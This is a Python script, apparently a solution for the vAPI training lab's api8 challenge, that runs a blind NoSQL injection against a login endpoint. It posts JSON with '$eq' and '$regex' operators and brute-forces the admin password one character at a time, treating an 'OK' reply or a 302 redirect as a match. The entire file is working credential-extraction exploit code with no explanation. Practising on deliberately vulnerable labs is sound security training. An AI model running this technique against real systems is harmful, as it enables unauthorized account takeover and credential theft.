import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://vapi.app/vapi/api8/user/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            print(">>>> %s" % (r.text))
            print("---> %s" % (password))
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c